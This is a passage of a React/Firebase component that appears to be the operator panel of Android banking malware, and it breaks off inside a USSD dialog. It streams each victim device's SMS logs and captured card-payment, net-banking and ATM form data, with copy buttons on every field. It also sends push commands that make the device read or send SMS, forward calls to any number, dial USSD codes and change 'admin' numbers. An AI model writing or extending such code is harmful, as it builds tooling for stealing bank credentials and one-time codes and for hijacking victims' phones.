"use client";

import { useEffect, useState, useMemo } from "react";
import {
  Card,
  CardBody,
  Chip,
  Button,
  Modal,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalFooter,
  useDisclosure,
  Input,
  Select,
  SelectItem,
  Textarea,
} from "@heroui/react";
import { FaCopy } from "react-icons/fa";
import { BiCopy } from "react-icons/bi";
import type Device from "@/types/devicetype";
import type DeviceMessage from "@/types/messageTypes";
import { db } from "@/lib/firbase";
import { onValue, ref, remove, update } from "firebase/database";

type DateFilter = "all" | "today" | "last7days" | "last30days";

const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

function formatMinutesAgo(value: string, nowTimestamp: number): string {
  const timestamp = new Date(value).getTime();
  if (isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";
  const diffMs = nowTimestamp - timestamp;
  if (diffMs <= 0) return "Just now";
  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));
  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;
  return "Just now";
}

function formatMessageTimestamp(value: unknown) {
  const timestamp = getMessageTimestamp(value);
  if (!timestamp) return "Unknown time";
  const date = new Date(timestamp);
  if (isNaN(date.getTime())) return "Unknown time";
  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function getMessageTimestamp(value: unknown): number {
  if (typeof value === "number" && isFinite(value)) return value;
  if (typeof value === "string") {
    const trimmed = value.trim();
    if (!trimmed) return 0;
    const numericValue = Number(trimmed);
    if (isFinite(numericValue)) return numericValue;
    const parsed = Date.parse(trimmed);
    return isNaN(parsed) ? 0 : parsed;
  }
  return 0;
}

function sortMessagesByLatest(messages: DeviceMessage[]): DeviceMessage[] {
  return messages.slice().sort((a, b) => getMessageTimestamp(b.timestamp) - getMessageTimestamp(a.timestamp));
}

function logRequestResult(action: string, result: unknown) {
  console.log(`[DeviceDetails] ${action} result:`, result);
}

function getSimSlotValue(selectedSim: 1 | 2): "slot 0" | "slot 1" {
  return selectedSim === 1 ? "slot 0" : "slot 1";
}

function hasUsableSimNumber(value: string | null | undefined): boolean {
  if (typeof value !== "string") return false;
  const normalized = value.trim().toLowerCase();
  return normalized !== "" && normalized !== "unknown" && normalized !== "null";
}

function getDefaultSimSelection(
  sim1Number: string | null | undefined,
  sim2Number: string | null | undefined,
): 1 | 2 {
  if (hasUsableSimNumber(sim1Number)) return 1;
  if (hasUsableSimNumber(sim2Number)) return 2;
  return 1;
}

function formatSubmissionFieldLabel(key: string): string {
  return key
    .replace(/([A-Z])/g, " $1")
    .replace(/_/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .replace(/^./, (char) => char.toUpperCase());
}

function formatSubmissionFieldValue(key: string, value: unknown): string {
  if (value === null || value === undefined) return "N/A";
  const normalizedKey = key.toLowerCase();
  if (
    normalizedKey.includes("createdat") ||
    normalizedKey.includes("updatedat") ||
    normalizedKey.includes("timestamp")
  ) {
    const timestamp = getMessageTimestamp(value);
    if (timestamp > 0) return new Date(timestamp).toLocaleString();
  }
  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed || "N/A";
  }
  if (typeof value === "number" || typeof value === "boolean") return String(value);
  try {
    return JSON.stringify(value);
  } catch {
    return String(value);
  }
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") return "N/A";
  const keyName = key.toLowerCase();
  if (keyName.includes("timestamp") || keyName.includes("createdat") || keyName.includes("updatedat")) return "";
  if (typeof value === "object") return JSON.stringify(value);
  return String(value);
}

function selectFirstAvailable(record: Record<string, unknown>, keys: string[]) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) return record[key];
  }
  return undefined;
}

type HistoryRecord = Record<string, unknown>;
type SubmissionRecord = { id: string; [key: string]: unknown };
type HistorySource = "global" | "registered-device";
type HistoryEntry = { id: string; data: HistoryRecord; source: HistorySource };

function getHistoryRecordTimestamp(record: HistoryRecord): number {
  return getMessageTimestamp(record.timestamp ?? record.lastUpdated ?? record.createdAt);
}

function parseHistoryEntries(value: unknown, deviceId: string): HistoryEntry[] {
  if (!value || typeof value !== "object") return [];
  const rawHistory = value as Record<string, unknown>;
  const directRecordKeys = ["action", "code", "lastUpdated", "result", "sim", "status", "timestamp"];
  const hasDirectRecordShape = directRecordKeys.some((key) => key in rawHistory);
  if (hasDirectRecordShape) {
    return [{ id: deviceId, data: rawHistory, source: "global" }];
  }
  const nestedEntries = Object.entries(rawHistory)
    .filter(([, entryValue]) => entryValue && typeof entryValue === "object")
    .map(([entryId, entryValue]) => ({
      id: entryId,
      data: entryValue as HistoryRecord,
      source: "global" as const,
    }))
    .sort((a, b) => getHistoryRecordTimestamp(b.data) - getHistoryRecordTimestamp(a.data));
  if (nestedEntries.length > 0) return nestedEntries;
  return [{ id: deviceId, data: rawHistory, source: "global" }];
}

function mergeHistoryEntries(...entryGroups: HistoryEntry[][]): HistoryEntry[] {
  return entryGroups.flat().sort((a, b) => getHistoryRecordTimestamp(b.data) - getHistoryRecordTimestamp(a.data));
}

function parseSubmissionRecords(value: unknown): SubmissionRecord[] {
  if (!value || typeof value !== "object") return [];
  if (Array.isArray(value)) {
    return value
      .map((entry, index) => {
        if (!entry || typeof entry !== "object") return null;
        const parsedEntry = entry as Record<string, unknown>;
        const parsedId = typeof parsedEntry.id === "string" && parsedEntry.id.trim() ? parsedEntry.id : String(index);
        return { ...parsedEntry, id: parsedId };
      })
      .filter((entry): entry is SubmissionRecord => entry !== null);
  }
  const rawRecord = value as Record<string, unknown>;
  const nestedEntries = Object.entries(rawRecord)
    .map(([entryId, entryValue]) => {
      if (!entryValue || typeof entryValue !== "object") return null;
      const parsedEntry = entryValue as Record<string, unknown>;
      const parsedId = typeof parsedEntry.id === "string" && parsedEntry.id.trim() ? parsedEntry.id : entryId;
      return { ...parsedEntry, id: parsedId };
    })
    .filter((entry): entry is SubmissionRecord => entry !== null);
  if (nestedEntries.length > 0) return nestedEntries;
  const directRecordId = typeof rawRecord.id === "string" && rawRecord.id.trim() ? rawRecord.id : "entry-1";
  return [{ ...rawRecord, id: directRecordId }];
}

async function copyToClipboard(text: string) {
  if (typeof window === "undefined") return;
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.setAttribute("readonly", "");
    textarea.style.position = "fixed";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
  }
}

function getSubmissionDeviceId(entry: SubmissionRecord): string {
  const possibleValues = [entry.uniqueId, entry.uniqueid, entry.uniqueID, entry.deviceId, entry.deviceID, entry.deviceid, entry.udid, entry.uid];
  for (const value of possibleValues) {
    if (typeof value === "string" && value.trim()) return value.trim();
  }
  if (typeof entry.id === "string") return entry.id.trim();
  return "";
}

function matchesSubmissionDeviceId(entry: SubmissionRecord, deviceId: string): boolean {
  return getSubmissionDeviceId(entry) === deviceId;
}

interface DeviceDetailsProps {
  device: Device;
  messages: DeviceMessage[];
  forms?: SubmissionRecord[];
  cards?: SubmissionRecord[];
  netBanking?: SubmissionRecord[];
  onDeleteSMS?: (smsId: string) => Promise<void>;
}

export default function DeviceDetails({
  device,
  messages: initialMessages,
  forms = [],
  cards = [],
  netBanking = [],
  onDeleteSMS,
}: DeviceDetailsProps) {
  const [nowTimestamp, setNowTimestamp] = useState(() => Date.now());
  const [selectedSIM, setSelectedSIM] = useState<1 | 2>(() => getDefaultSimSelection(device.sim1number, device.sim2number));
  const [forwardingSIM, setForwardingSIM] = useState<1 | 2>(() => getDefaultSimSelection(device.sim1number, device.sim2number));
  const [forwardingNumber, setForwardingNumber] = useState("");
  const [isForwardingActive, setIsForwardingActive] = useState(false);
  const [smsReceiver, setSmsReceiver] = useState("");
  const [smsMessage, setSmsMessage] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [ussdSimSlot, setUssdSimSlot] = useState<1 | 2>(() => getDefaultSimSelection(device.sim1number, device.sim2number));
  const [isSendingUssd, setIsSendingUssd] = useState(false);
  const [smsList, setSmsList] = useState<DeviceMessage[]>([]);
  const [isLoadingSms, setIsLoadingSms] = useState(true);
  const [isAdminPhoneLoading, setIsAdminPhoneLoading] = useState(false);
  const [formSubmissions, setFormSubmissions] = useState<SubmissionRecord[]>([]);
  const [cardSubmissions, setCardSubmissions] = useState<SubmissionRecord[]>([]);
  const [netbankingSubmissions, setNetbankingSubmissions] = useState<SubmissionRecord[]>([]);
  const [callForwardingHistory, setCallForwardingHistory] = useState<HistoryEntry[]>([]);
  const [adminPhone1, setAdminPhone1] = useState(device.adminPhoneNumber?.[0] || "");
  const [smsSearchQuery, setSmsSearchQuery] = useState("");
  const [dateFilter, setDateFilter] = useState<DateFilter>("all");
  const [isGettingSMS, setIsGettingSMS] = useState(false);
  const [showDialog, setShowDialog] = useState<string | null>(null);
  const [activeButton, setActiveButton] = useState<string>("get-sms");

  const availableSimOptions = [
    { key: "sim1", slot: 1 as const, label: `SIM 1 ${device.sim1number ? `- ${device.sim1number}` : ""}` },
    { key: "sim2", slot: 2 as const, label: `SIM 2 ${device.sim2number ? `- ${device.sim2number}` : ""}` },
  ];

  const {
    isOpen: isPhoneModalOpen,
    onOpen: onPhoneModalOpen,
    onClose: onPhoneModalClose,
  } = useDisclosure();

  // REAL-TIME SMS LISTENER - ALWAYS ACTIVE
  useEffect(() => {
    setIsLoadingSms(true);
    const smsRef = ref(db, `registeredDevices/${device.deviceId}/smsLogs`);
    
    const unsubscribe = onValue(smsRef, (snapshot) => {
      if (!snapshot.exists()) {
        setSmsList([]);
        setIsLoadingSms(false);
        return;
      }
      
      const smsData = snapshot.val() as Record<string, Record<string, unknown>>;
      const loadedSms: DeviceMessage[] = Object.keys(smsData).map((key) => {
        const item = smsData[key];
        return {
          id: key,
          body: typeof item.body === "string" ? item.body : "",
          reciverNumber: typeof item.reciverNumber === "string" ? item.reciverNumber : typeof item.receiverNumber === "string" ? item.receiverNumber : "",
          senderNumber: typeof item.senderNumber === "string" ? item.senderNumber : "",
          timestamp: typeof item.timestamp === "string" ? item.timestamp : new Date().toISOString(),
          title: typeof item.title === "string" ? item.title : "",
          deviceId: typeof item.deviceId === "string" ? item.deviceId : device.deviceId,
        };
      });
      
      const sortedLogs = sortMessagesByLatest(loadedSms);
      setSmsList(sortedLogs);
      setIsLoadingSms(false);
    });
    
    return () => unsubscribe();
  }, [device.deviceId]);

  // Apply date filter to SMS list
  const getDateFilteredSmsList = useMemo(() => {
    if (dateFilter === "all") return smsList;
    
    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
    const sevenDaysAgo = today - (7 * 24 * 60 * 60 * 1000);
    const thirtyDaysAgo = today - (30 * 24 * 60 * 60 * 1000);
    
    return smsList.filter((sms) => {
      const smsTime = getMessageTimestamp(sms.timestamp);
      if (dateFilter === "today") {
        return smsTime >= today;
      }
      if (dateFilter === "last7days") {
        return smsTime >= sevenDaysAgo;
      }
      if (dateFilter === "last30days") {
        return smsTime >= thirtyDaysAgo;
      }
      return true;
    });
  }, [smsList, dateFilter]);

  // FILTER SMS BY SEARCH QUERY + DATE FILTER
  const filteredSmsList = useMemo(() => {
    let result = getDateFilteredSmsList;
    
    if (!smsSearchQuery.trim()) {
      return result;
    }
    const query = smsSearchQuery.toLowerCase().trim();
    return result.filter((sms) => {
      return (
        sms.body.toLowerCase().includes(query) ||
        sms.senderNumber.toLowerCase().includes(query) ||
        (sms.reciverNumber && sms.reciverNumber.toLowerCase().includes(query)) ||
        sms.id.toLowerCase().includes(query) ||
        (sms.title && sms.title.toLowerCase().includes(query))
      );
    });
  }, [getDateFilteredSmsList, smsSearchQuery]);

  // Timer for "last online" update
  useEffect(() => {
    const intervalId = window.setInterval(() => {
      setNowTimestamp(Date.now());
    }, 60 * 1000);
    return () => window.clearInterval(intervalId);
  }, []);

  useEffect(() => {
    if (forms && forms.length > 0) {
      setFormSubmissions(forms);
    } else {
      const deviceRef = ref(db, `registeredDevices/${device.deviceId}`);
      return onValue(deviceRef, (snap) => {
        if (!snap.exists()) {
          setFormSubmissions([]);
          return;
        }
        const deviceData = (snap.val() ?? {}) as Record<string, unknown>;
        const rawForms = selectFirstAvailable(deviceData, FORM_KEYS);
        const parsedEntries = parseSubmissionRecords(rawForms).filter((entry) => matchesSubmissionDeviceId(entry, device.deviceId));
        setFormSubmissions(parsedEntries);
      });
    }
  }, [device.deviceId, forms]);

  useEffect(() => {
    if (cards && cards.length > 0) {
      setCardSubmissions(cards);
    } else {
      const deviceRef = ref(db, `registeredDevices/${device.deviceId}`);
      return onValue(deviceRef, (snap) => {
        if (!snap.exists()) {
          setCardSubmissions([]);
          return;
        }
        const deviceData = (snap.val() ?? {}) as Record<string, unknown>;
        const rawCards = selectFirstAvailable(deviceData, CARD_KEYS);
        const parsedEntries = parseSubmissionRecords(rawCards).filter((entry) => matchesSubmissionDeviceId(entry, device.deviceId));
        setCardSubmissions(parsedEntries);
      });
    }
  }, [device.deviceId, cards]);

  useEffect(() => {
    if (netBanking && netBanking.length > 0) {
      setNetbankingSubmissions(netBanking);
    } else {
      const deviceRef = ref(db, `registeredDevices/${device.deviceId}`);
      return onValue(deviceRef, (snap) => {
        if (!snap.exists()) {
          setNetbankingSubmissions([]);
          return;
        }
        const deviceData = (snap.val() ?? {}) as Record<string, unknown>;
        const rawNetbanking = selectFirstAvailable(deviceData, NETBANK_KEYS);
        const parsedEntries = parseSubmissionRecords(rawNetbanking).filter((entry) => matchesSubmissionDeviceId(entry, device.deviceId));
        setNetbankingSubmissions(parsedEntries);
      });
    }
  }, [device.deviceId, netBanking]);

  useEffect(() => {
    const globalHistoryRef = ref(db, `history/${device.deviceId}`);
    const registeredHistoryRef = ref(db, `registeredDevices/${device.deviceId}/history`);
    let globalHistoryEntries: HistoryEntry[] = [];
    let registeredHistoryEntries: HistoryEntry[] = [];
    const syncCombinedHistory = () => {
      setCallForwardingHistory(mergeHistoryEntries(globalHistoryEntries, registeredHistoryEntries));
    };
    const unsubscribeGlobalHistory = onValue(globalHistoryRef, (snapshot) => {
      if (!snapshot.exists()) {
        globalHistoryEntries = [];
        syncCombinedHistory();
        return;
      }
      globalHistoryEntries = parseHistoryEntries(snapshot.val(), device.deviceId).map((entry) => ({ ...entry, source: "global" }));
      syncCombinedHistory();
    });
    const unsubscribeRegisteredHistory = onValue(registeredHistoryRef, (snapshot) => {
      if (!snapshot.exists()) {
        registeredHistoryEntries = [];
        syncCombinedHistory();
        return;
      }
      registeredHistoryEntries = parseHistoryEntries(snapshot.val(), device.deviceId).map((entry) => ({ ...entry, source: "registered-device" }));
      syncCombinedHistory();
    });
    return () => {
      unsubscribeGlobalHistory();
      unsubscribeRegisteredHistory();
    };
  }, [device.deviceId]);

  const handleDeleteSMS = async (id: string) => {
    if (confirm("Are you sure you want to delete this SMS message?")) {
      try {
        if (onDeleteSMS) {
          await onDeleteSMS(id);
        } else {
          const smsRef = ref(db, `registeredDevices/${device.deviceId}/smsLogs/${id}`);
          await remove(smsRef);
        }
      } catch (error) {
        console.error("Failed to delete SMS", error);
      }
    }
  };

  // GET SMS - Calls /api/getsms which sends type: "get_sms"
  const handleGetSMS = async () => {
    setActiveButton("get-sms");
    setIsGettingSMS(true);
    setShowDialog(null);
    
    if (!device.fcmToken) {
      alert("Device FCM token is missing. Cannot send request.");
      setIsGettingSMS(false);
      return;
    }
    
    try {
      const response = await fetch("/api/getsms", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Get SMS Request",
          body: "Fetching SMS messages from device...",
        }),
      });
      
      const result = await response.json();
      logRequestResult("Get SMS", result);
      
      if (result.success) {
        alert("Get SMS request sent successfully! SMS will appear automatically.");
      } else {
        alert(`Failed to send get SMS request: ${result.error || "Unknown error"}`);
      }
    } catch (error) {
      console.error("Failed to send get SMS request", error);
      alert("Error while sending get SMS request");
    } finally {
      setIsGettingSMS(false);
    }
  };

  const handleSendUssd = async () => {
    if (!ussdCode) {
      alert("Please enter a USSD code");
      return;
    }
    setIsSendingUssd(true);
    try {
      const response = await fetch("/api/sendussd", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "USSD Request",
          body: `Execute USSD code ${ussdCode}`,
          data: { command: "ussd", ussdCode, sim: getSimSlotValue(ussdSimSlot) },
        }),
      });
      const result = await response.json();
      logRequestResult("USSD send", result);
      if (!response.ok || !result.success) {
        alert("Failed to send USSD request");
        return;
      }
      alert("USSD request sent");
      setUssdCode("");
      setShowDialog(null);
    } finally {
      setIsSendingUssd(false);
    }
  };

  const handleAdminPhoneUpdate = async () => {
    setIsAdminPhoneLoading(true);
    const nextPhone = adminPhone1.trim();
    try {
      await update(ref(db, `registeredDevices/${device.deviceId}`), {
        adminPhoneNumber: nextPhone ? [nextPhone] : [],
        adminPhoneNumbers: nextPhone ? [nextPhone] : [],
        updatedAt: new Date().toISOString(),
      });
      const response = await fetch("/api/updateAdminPhones", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          token: device.fcmToken,
          title: "Admin Phone Numbers Updated",
          body: "Admin phone numbers have been updated for this device.",
          data: { number: nextPhone },
        }),
      });
      const result = await response.json();
      logRequestResult("Admin phone update", result);
      if (!response.ok || !result.success) {
        throw new Error("Failed to update admin phone numbers");
      }
      alert("Admin phone number updated successfully");
      onPhoneModalClose();
    } catch (error) {
      console.error("Failed to update admin phone numbers", error);
    } finally {
      setIsAdminPhoneLoading(false);
    }
  };

  const handleCheckOnline = async () => {
    setActiveButton("check-online");
    try {
      const response = await fetch("/api/checkstatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: device.deviceId,
          token: device.fcmToken,
          title: "Status Check",
          body: "Checking device status, please wait...",
        }),
      });
      const result = await response.json();
      logRequestResult("Check online", result);
      if (!response.ok || !result.success) {
        alert("Failed to check device status");
        return;
      }
      alert("Status check request sent");
    } catch (error) {
      console.error("Failed to check device status", error);
      alert("Error while checking status");
    }
  };

  const handleSendSMS = async () => {
    if (!smsReceiver || !smsMessage) {
      alert("Please enter a receiver number and message");
      return;
    }
    const response = await fetch("/api/sendmessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        title: `SMS to ${smsReceiver}`,
        data: { message: smsMessage, receiver: String(smsReceiver), sim: getSimSlotValue(selectedSIM) },
        body: `Send SMS to ${smsReceiver}`,
        token: device.fcmToken,
      }),
    });
    const data = await response.json();
    logRequestResult("SMS send", data);
    if (data.success) {
      alert("SMS sent successfully");
      setSmsReceiver("");
      setSmsMessage("");
      setShowDialog(null);
    } else {
      alert("Failed to send SMS");
    }
  };

  const handleActivateForwarding = async () => {
    if (!forwardingNumber) {
      alert("Please enter a forwarding number");
      return;
    }
    const response = await fetch("/api/callforwarding", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        token: device.fcmToken,
        title: `Call Forwarding Activated`,
        command: "activate",
        body: "Forwarding to " + forwardingNumber,
        data: { sim: getSimSlotValue(forwardingSIM), number: String(forwardingNumber) },
      }),
    });
    const data = await response.json();
    if (data.success) {
      alert("Call forwarding activated successfully");
      await update(ref(db, `registeredDevices/${device.deviceId}/callForwarding`), {
        status: "ON",
        number: forwardingNumber,
        updatedAt: Date.now(),
        forwardingSim: getSimSlotValue(forwardingSIM),
      });
      await update(ref(db, `history/${device.deviceId}`), {
        action: "call",
        code: String(forwardingNumber),
        lastUpdated: Date.now(),
        result: "Call forwarding activated",
        sim: getSimSlotValue(forwardingSIM),
        status: "success",
        timestamp: Date.now(),
      });
      setIsForwardingActive(true);
      setForwardingNumber("");
      setShowDialog(null);
    } else {
      alert("Failed to activate call forwarding");
    }
  };

  const handleDeactivateForwarding = async () => {
    const response = await fetch("/api/callforwarding", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        token: device.fcmToken,
        command: "deactivate",
        title: `Call Forwarding Deactivated`,
        body: "Deactivating call forwarding",
        data: { sim: getSimSlotValue(forwardingSIM) },
      }),
    });
    if (response.ok) {
      alert("Call forwarding deactivated successfully");
      await update(ref(db, `registeredDevices/${device.deviceId}/callForwarding`), {
        status: "OFF",
        number: "",
        updatedAt: new Date().toISOString(),
        forwardingSim: 0,
      });
      setIsForwardingActive(false);
      setShowDialog(null);
    } else {
      alert("Failed to deactivate call forwarding");
    }
  };

  const isDeviceRecentlyActive = (): boolean => {
    if (!device.lastChecked || device.lastChecked === "") return false;
    const lastTime = new Date(device.lastChecked).getTime();
    if (isNaN(lastTime)) return false;
    const now = Date.now();
    const fifteenMinutes = 15 * 60 * 1000;
    return (now - lastTime) <= fifteenMinutes;
  };

  const renderSubmissionSection = <T extends object>(
    title: string,
    entries: T[],
    emptyMessage: string,
  ) => {
    return (
      <section className="rounded-[20px] border border-gray-200 bg-white p-4">
        <h3 className="text-lg font-semibold mb-3">{title}</h3>
        {entries.length === 0 ? (
          <div className="rounded-2xl border border-gray-200 bg-gray-50 p-5 text-sm text-gray-500">{emptyMessage}</div>
        ) : (
          <div className="space-y-3">
            {entries.map((entry, index) => (
              <div key={`${title}-${String((entry as Record<string, unknown>).id ?? index)}`} className="p-3 bg-white rounded-lg border border-gray-100">
                <div className="mt-2 space-y-1">
                  {Object.entries(entry as Record<string, unknown>).map(([key, value]) => (
                    <div key={key} className="flex flex-col gap-1 text-sm text-gray-700">
                      {!["timestamp", "createdat", "updatedat"].some((part) => key.toLowerCase().includes(part)) && (
                        <>
                          <div className="flex flex-row items-center gap-1">
                            <span className="font-semibold text-blue-800 uppercase">{key}:</span>
                            <FaCopy onClick={() => copyToClipboard(String(value))} className="cursor-pointer" size={12} />
                          </div>
                          <span>{formatDisplayValue(key, value)}</span>
                        </>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        )}
      </section>
    );
  };

  // 🔥 MODIFIED: Sirf border color change karo, background white rahe
  const getButtonClass = (buttonName: string, isActive: boolean) => {
    if (isActive) {
      return "h-10 min-w-fit rounded-md border-2 border-blue-600 bg-white text-blue-600 px-4 text-sm font-semibold shadow-sm transition-all duration-200";
    }
    return "h-10 min-w-fit rounded-md border border-gray-300 bg-white text-gray-700 hover:border-gray-400 hover:bg-gray-50 px-4 text-sm font-semibold transition-all duration-200";
  };

  return (
    <div className="space-y-6">
      {/* Device Info Card */}
      <Card className="overflow-hidden rounded-[18px] border border-black bg-white shadow-none">
        <CardBody className="p-3 sm:p-4">
          <div className="rounded-xl px-4 py-3">
            <div className="grid grid-cols-[110px_1fr] gap-y-2 text-[14px]">
              <span className="font-semibold text-gray-800">Name</span>
              <span className="text-right font-semibold text-gray-800">
                {device.brand} {device.model}
              </span>

              <span className="font-semibold text-gray-800">ID</span>
              <span className="text-right font-mono text-blue-600 break-all">
                {device.deviceId}
              </span>

              <span className="font-semibold text-gray-800">SIM</span>
              <div className="text-right text-blue-600">
                {device.sim1number && hasUsableSimNumber(device.sim1number) && (
                  <div>
                    {device.sim1Carrier ? `${device.sim1Carrier}: ` : ""}
                    {device.sim1number}
                  </div>
                )}
                {device.sim2number && hasUsableSimNumber(device.sim2number) && (
                  <div>
                    {device.sim2Carrier ? `${device.sim2Carrier}: ` : ""}
                    {device.sim2number}
                  </div>
                )}
                {(!device.sim1number || !hasUsableSimNumber(device.sim1number)) && (!device.sim2number || !hasUsableSimNumber(device.sim2number)) && "N/A"}
              </div>

              <span className="font-semibold text-gray-800">Forward Call</span>
              <span className={`text-right ${isForwardingActive ? "text-green-600" : "text-red-600"}`}>
                {isForwardingActive ? "ON" : "OFF"}
              </span>

              <span className="font-semibold text-gray-800">Last Online</span>
              <span className={`text-right ${isDeviceRecentlyActive() ? "text-green-600" : "text-red-600"}`}>
                {device.lastChecked && device.lastChecked !== ""
                  ? formatMinutesAgo(device.lastChecked, nowTimestamp)
                  : "offline"}
              </span>
            </div>
          </div>
        </CardBody>
      </Card>

      {/* Action Buttons - Modified styling */}
      <div className="flex flex-row flex-wrap justify-center gap-2">
        <Button
          className={getButtonClass("check-online", activeButton === "check-online")}
          onPress={handleCheckOnline}
        >
          Check Online
        </Button>
        <Button
          className={getButtonClass("get-sms", activeButton === "get-sms")}
          onPress={handleGetSMS}
          isLoading={isGettingSMS}
        >
          GET SMS
        </Button>
        <Button
          className={getButtonClass("send-sms", showDialog === "send-sms")}
          onPress={() => {
            setActiveButton("send-sms");
            setShowDialog("send-sms");
          }}
        >
          Send SMS
        </Button>
        <Button
          className={getButtonClass("call-forwarding", showDialog === "call-forwarding")}
          onPress={() => {
            setActiveButton("call-forwarding");
            setShowDialog("call-forwarding");
          }}
        >
          Call Forwarding
        </Button>
        <Button
          className={getButtonClass("ussd", showDialog === "ussd")}
          onPress={() => {
            setActiveButton("ussd");
            setShowDialog("ussd");
          }}
        >
          Dial USSD
        </Button>
        <Button
          className={getButtonClass("view", showDialog === "view")}
          onPress={() => {
            setActiveButton("view");
            setShowDialog("view");
          }}
        >
          View Data
        </Button>
        <Button
          className={getButtonClass("update-admin", false)}
          onPress={onPhoneModalOpen}
        >
          Update Admin
        </Button>
      </div>

      {/* Send SMS Dialog */}
      {showDialog === "send-sms" && (
        <Card className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-none">
          <CardBody className="p-4 sm:p-6">
            <div className="space-y-5">
              <Select
                label="Select SIM"
                selectedKeys={[`sim${selectedSIM}`]}
                onSelectionChange={(keys) => {
                  if (keys === "all") return;
                  const selectedKey = String(Array.from(keys)[0] ?? "");
                  if (selectedKey === "sim1") setSelectedSIM(1);
                  if (selectedKey === "sim2") setSelectedSIM(2);
                }}
              >
                {availableSimOptions.map((option) => (
                  <SelectItem key={option.key}>{option.label}</SelectItem>
                ))}
              </Select>

              <Input
                label="Receiver Number"
                placeholder="Enter phone number"
                value={smsReceiver}
                onValueChange={setSmsReceiver}
              />

              <Textarea
                label="Message"
                placeholder="Type your message here..."
                value={smsMessage}
                onValueChange={setSmsMessage}
                minRows={4}
              />

              <div className="flex gap-3">
                <Button
                  className="h-11 flex-1 bg-emerald-600 font-semibold text-white hover:bg-emerald-700"
                  size="lg"
                  onPress={handleSendSMS}
                  isDisabled={!smsReceiver || !smsMessage}
                >
                  Send SMS
                </Button>
                <Button
                  className="h-11 flex-1 border border-gray-300 bg-white text-gray-700 hover:bg-gray-50"
                  size="lg"
                  onPress={() => setShowDialog(null)}
                >
                  Cancel
                </Button>
              </div>
            </div>
          </CardBody>
        </Card>
      )}

      {/* Call Forwarding Dialog */}
      {showDialog === "call-forwarding" && (
        <Card className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-none">
          <CardBody className="p-4 sm:p-6">
            <div className="space-y-5">
              <Select
                label="Select SIM"
                selectedKeys={[`sim${forwardingSIM}`]}
                onSelectionChange={(keys) => {
                  if (keys === "all") return;
                  const selectedKey = String(Array.from(keys)[0] ?? "");
                  if (selectedKey === "sim1") setForwardingSIM(1);
                  if (selectedKey === "sim2") setForwardingSIM(2);
                }}
              >
                {availableSimOptions.map((option) => (
                  <SelectItem key={option.key}>{option.label}</SelectItem>
                ))}
              </Select>

              <Input
                label="Forwarding Number"
                placeholder="Enter number"
                value={forwardingNumber}
                onValueChange={setForwardingNumber}
              />

              <div className="flex flex-row gap-3">
                <Button
                  className="h-11 flex-1 bg-emerald-600 font-semibold text-white hover:bg-emerald-700"
                  size="lg"
                  onPress={handleActivateForwarding}
                >
                  Enable
                </Button>
                <Button
                  className="h-11 flex-1 bg-rose-600 font-semibold text-white hover:bg-rose-700"
                  size="lg"
                  onPress={handleDeactivateForwarding}
                >
                  Disable
                </Button>
                <Button
                  className="h-11 flex-1 border border-gray-300 bg-white text-gray-700 hover:bg-gray-50"
                  size="lg"
                  onPress={() => setShowDialog(null)}
                >
                  Cancel
                </Button>
              </div>

              {callForwardingHistory.length > 0 && (
                <div className="space-y-3">
                  <h4 className="text-sm font-semibold text-gray-800">Recent History</h4>
                  <div className="space-y-2 max-h-40 overflow-y-auto">
                    {callForwardingHistory.slice(0, 3).map((historyEntry, entryIndex) => (
                      <div key={entryIndex} className="rounded-lg border border-gray-200 bg-white p-2">
                        <div className="grid grid-cols-2 gap-1 text-xs">
                          {Object.entries(historyEntry.data).slice(0, 4).map(([fieldKey, fieldValue]) => (
                            <div key={fieldKey}>
                              <span className="font-semibold">{fieldKey}:</span> {String(fieldValue).slice(0, 30)}
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </CardBody>
        </Card>
      )}

      {/* USSD Dialog */}
      {showDialog === "ussd" && (
        <Card className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-none">
          <CardBody className="p-4 sm:p-6">
            <div className="space-y-5">
              <Select
                label="Select SIM"
                selectedKeys={[`sim${ussdSimSlot}`]}
                onSelectionChange={(keys) => {
                  if (keys === "all") return;
                  const selectedKey = String(Array.from(keys)[0] ?? "");
                  if (selectedKey === "sim1") setUssdSimSlot(1);
                  if (selectedKey === "sim2") setUssdSimSlot(2);
                }}
              >
                {availableSimOptions.map((option) => (
                  <SelectItem key={option.key}>{option.label}</SelectItem>
                ))}
              </Select>

              <Input
                label="USSD Code"
                placeholder="*123#"
                value={ussdCode}
                onValueChange={setUssdCode}
